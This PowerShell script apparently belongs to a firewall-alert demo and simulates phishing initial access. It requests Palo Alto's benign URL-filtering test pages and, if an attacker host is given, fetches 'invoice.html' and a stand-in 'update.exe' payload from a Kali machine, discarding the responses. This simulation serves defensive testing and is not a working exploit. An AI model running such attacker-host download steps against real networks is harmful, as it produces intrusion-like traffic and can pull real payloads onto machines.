<#
    _ia-phishing.ps1  --  Role-correct CLIENT-SIDE initial access.
    ==============================================================
    Topology: the machine running this is the VICTIM (Windows); the attacker /
    C2 is the Kali box. A real intrusion of an endpoint starts with the *victim*
    reaching OUT to attacker infrastructure - a phishing lure and a malicious
    download - not the victim attacking a server. That outbound access is what
    the firewall flags as the entry point.

      EAL / firewall alerts:
        - Phishing site access / Suspicious Phishing Site Access (URL Filtering)
        - malware URL category (URL Filtering)  -> the drive-by download
      Reliable because URL Filtering categorises these on the request.

    Uses Palo Alto's benign URL-Filtering TEST pages (categorised as phishing /
    malware) so the alert fires predictably, and also pulls a "payload" from the
    attacker (Kali) host so the victim->attacker delivery leg is real.
#>

function Invoke-PhishingIA {
    param([string]$AttackerHost = $null)
    $cfg  = $Global:EalDemo
    $base = "http://urlfiltering.paloaltonetworks.com"

    # 1) Victim is lured to a phishing page + a malware drive-by (categorised).
    $urls = @(
        @{ U="$base/test-phishing"; T="phishing lure" },
        @{ U="$base/test-malware";  T="malware drive-by" }
    )
    # 2) Victim pulls the actual payload from the attacker (Kali) host.
    if ($AttackerHost) {
        $urls += @{ U="http://$AttackerHost/invoice.html";  T="attacker phishing page" }
        $urls += @{ U="http://$AttackerHost/update.exe";    T="payload download from attacker" }
    }

    foreach ($x in $urls) {
        if ($cfg.DryRun) { Write-Host "  DRY: GET $($x.U)   ($($x.T))"; continue }
        try {
            Invoke-WebRequest -Uri $x.U -TimeoutSec 10 -UseBasicParsing -ErrorAction Stop | Out-Null
            Write-Stage "  victim accessed $($x.T): $($x.U)" "OK"
        } catch {
            Write-Stage "  $($x.T) blocked by firewall (expected): $($x.U)" "BLOCK"
        }
        Start-Sleep -Milliseconds $cfg.DelayBetweenReqMs
    }
}
